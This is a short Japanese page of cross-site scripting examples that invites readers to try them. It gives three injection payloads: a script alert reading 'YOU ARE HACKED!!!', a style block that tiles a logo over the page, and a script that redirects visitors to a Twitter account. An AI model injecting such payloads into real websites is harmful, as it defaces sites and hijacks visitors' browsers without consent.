# XSS の例

色々あります。ぜひ試してみてください。

## アラートを出す

```css
<script>alert("YOU ARE HACKED!!!");</script>
```

## 背景をおかしくする

```css
<style>
body {
  background-image: url("https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png");
  background-repeat: repeat;
}
</style> 
```

## 特定のサイトに飛ばす

```css
<script>window.location.href = 'https://twitter.com/huitgroup';</script>
```
